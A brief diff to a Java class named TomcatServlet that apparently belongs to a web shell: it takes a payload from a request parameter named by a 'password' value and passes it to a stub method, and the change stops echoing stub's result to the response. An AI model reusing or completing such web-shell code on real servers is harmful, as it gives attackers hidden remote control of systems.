@@ -13,10 +13,7 @@ public class TomcatServlet extends ClassLoader implements InvocationHandler {{
         String payload = (String) invokeMethod(
             servletRequest, "getParameter", password
         );
-        invokeMethod(
-            invokeMethod(servletResponse, "getWriter"),
-            "write", stub(payload, servletRequest, servletResponse)
-        );
+        stub(payload, servletRequest, servletResponse);
     }}
 
     @Override
